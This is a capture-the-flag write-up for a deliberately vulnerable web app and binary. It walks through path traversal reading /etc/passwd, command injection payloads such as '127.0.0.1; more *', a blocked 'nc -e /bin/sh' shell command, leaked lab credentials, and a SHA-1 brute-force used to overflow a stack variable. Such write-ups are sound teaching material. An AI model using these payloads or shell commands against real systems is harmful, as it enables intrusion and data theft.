#                                   TASK 8 - PClub DVWA
The task says “got to know that in the Directory of the website, there was a file routes.txt that stored a list of all routes that would lead anyone to further penetrate into the website and exploit more vulnerabilities” suggesting a directory traversal vulnerability. 
[http://74.225.254.195:2324/getFile?file=../../../../../etc/passwd](http://74.225.254.195:2324/getFile?file=../../../../../etc/passwd)
confirms this
![This is an alt text.](/github/etc_pass.png)

In view page source of the gallery we see that the links are of the format:

[http://74.225.254.195:2324/getFile?file=/home/kaptaan/PClub-DVWA/static/images/gallery/3.jpeg](http://74.225.254.195:2324/getFile?file=/home/kaptaan/PClub-DVWA/static/images/gallery/3.jpeg)

Which has a directory PClub-DVWA , hence we try the link 
[http://74.225.254.195:2324/getFile?file=/home/kaptaan/PClub-DVWA/routes.txt](http://74.225.254.195:2324/getFile?file=/home/kaptaan/PClub-DVWA/routes.txt)


![and get](/github/routes.png)

Here we get our first flag : **pclub{path_trav3rsa1_1s_fun}**

We also see clue to our next flag, “*Can you now get me the MAC Address of eth0 interface for this machine for me??? Using command injection ;)*” 

Thus we need to find the webpage now which is vulnerable to command injections which was [http://74.225.254.195:2324/ipDetails](http://74.225.254.195:2324/ipDetails) . We specifically used the ip address 127.0.0.1 as it is a special address which loops back to the local machine.

![This is an alt text.](/github/ifconfig.png)

We see the mac address - 60:45:bd:af:3f:e5 
\
Here we get our second flag : **pclub{60:45:bd:af:3f:e5}**

Now we have no more clues, so we explore more with basic command injections and observe that : 127.0.0.1; ls and 127.0.0.1; nc -e /bin/sh  doesn’t give any output i.e. They must be in the block list command, however we quickly discover that 127.0.0.1; dir does give out all the directories, and doing 127.0.0.1; more * simply gives all the content of the files present. 

In users.json we see we have all the username and password for  [http://74.225.254.195:2324/secretary_login](http://74.225.254.195:2324/secretary_login) and in particular  "amansg22": "SHAZISSXY" opens a web page with a file “ariitk.jpeg”.

![This is an alt text.](/github/ariitk.jpeg)
The flag can be obtained simply by steganography. Putting the image in the website : [https://www.aperisolve.com/](https://www.aperisolve.com/) 
We get a qrcode - 

![This is an alt text.](/github/qr_code.png)

Scanning it we get , **Y3B5aG97cW5nbl8xZl8zaTNlbGd1MWF0fQ==**
The two equal signs at last strongly suggest that this is in b64 , decoding it gives *cpyho{qngn_1f_3i3elgu1at}* , also we know that flag must be in format of pclub{...} we can see it is just ROT-13 encoded, we decode it to get our third flag :
                    **pclub{data_1s_3v3ryth1ng}**



Also with command injection 127.0.0.1; more * we see one more username : kaptaan and password: 0123456789
![This is an alt text.](/github/kaptaan.png)
Which gives us a file “flag.txt” and we get our fourth flag: **pclub{01d_1s_g01d_sql1}**

Another username and password, "ritvikg22": "cocacolaborasi”
Which gives us the file for our final challenge pwn_chall_link.txt which contains a link [https://pastebin.com/Jd17mvk5](https://pastebin.com/Jd17mvk5)

The hidden comment in pastebin suggests buffer overflow vulnerability.
Decompiling the binary file “whathash” which we get from the google drive we see essentially three functions : main, check, shachecker

```
int main(void)

{
  char cVar1;
  char local_194 [128];
  undefined local_114 [128];
  undefined local_94 [128];
  FILE *local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  setbuf(_stdout,(char *)0x0);
  memset(local_94,0,0x80);
  memset(local_114,0,0x80);
  puts("Someone blocked Pclub Coordinator @haardikk from logging in to this super secure system!");
  puts("But somehow, he still manages to get in... how?!?!");
  printf("Username: ");
  read(0,local_94,0x80);
  printf("Password: ");
  read(0,local_114,0x80);
  cVar1 = check(local_94,local_114);
  if (cVar1 == '\0') {
    puts("Access denied!");
  }
  else {
    local_14 = fopen("flag.txt","r");
    if (local_14 == (FILE *)0x0) {
      perror("Error opening file");
      return 1;
    }
    fgets(local_194,0x80,local_14);
    fclose(local_14);
    puts("Access granted!");
    printf("Flag: %s\n",local_194);
  }
  return 0;
}



bool check(char *param_1,undefined4 param_2)
{
  char cVar1;
  size_t sVar2;
  int iVar3;
  undefined local_20 [18];
  short local_e;
  local_e = 0x1337;
  memset(local_20,0,0x12);
  sha1(param_2,local_20);
  sVar2 = strlen(param_1);
  iVar3 = strncmp(param_1,"Haardikk",sVar2 - 1);
  if (iVar3 == 0) {
    puts("Haardikk, you are not allowed !!! ");
  }
  else {
    cVar1 = shachecker("c832724069b0cf39e47a041d11ef9ebb9c718c0e",local_20);
    if (cVar1 != '\0') {
      local_e = 0;
    }
  }
  return local_e == 0;
}

bool shachecker(char *param_1,int param_2)

{
  int iVar1;
  char local_3d [41];
  size_t local_14;
  int local_10;
  
  memset(local_3d,0,0x29);
  for (local_10 = 0; local_10 < 0x14; local_10 = local_10 + 1) {
    sprintf(local_3d + local_10 * 2,"%02x",(uint)*(byte *)(param_2 + local_10));
  }
  local_14 = strlen(param_1);
  iVar1 = strncmp(param_1,local_3d,local_14 - 1);
  return iVar1 == 0;
} 
```
In main there is no scope of buffer overflow as read reads exactly 128 bytes, i.e. equal to the size of buffer ```local_114``` and ```local_94```.We also see that if ```local_e``` is set to 0 in check function then we will be granted access. We also observe that in stack ```local_e``` and ```local_20``` are next to each other.

![This is an alt text.](/github/pwn.jpeg)
![This is an alt text.](/github/13370.jpeg)
![This is an alt text.](/github/d3bb.jpeg)



```local_e``` which was set to 0x**1337**0000 before, was overwritten to 0x**d3bb** after running the program. The hash of password we provided (test) happens to be **a94a8fe5ccb19ba61c4c0873d391e987982fbbd3** of which the last two bytes are bbd3 which we can see overwrote to local_e .Hence local_e and local_20 are exactly 18 bytes apart , however the local_20 variable takes 20 bytes input i.e. hash of the password and the last two bytes overwrite to local_e . Now if the last two bytes of hash is \x00\x00 then we can overwrite local_e to be 0 which will grant us access to the flag. 

We write a code to generate such a password
```
import hashlib
import random
import string

num=0
while True and num<5:
    # payload = random.getrandbits(128).to_bytes(16, 'big')
    payload = "".join(random.choices(string.ascii_letters, k=16)).encode()
    hashvalue = hashlib.sha1(payload).digest()
    if hashvalue[-2:] == b"\x00\x00":
        print(payload, hashvalue)
	   num+=1

```
![This is an alt text.](/github/payload.png)

We can use any of the payload as password and Username can anything except “Haardikk” as ```iVar3``` will then be set to 0 which will give us  "Haardikk, you are not allowed !!! ".

Running the program we get

![This is an alt text.](/github/flag.png)


Here we get our final flag :**pclub{d0_y0u_kn0w_7h47_h0w_much_1_5truggl3d_w1th_0p3n55l_wtf_rockyou}**

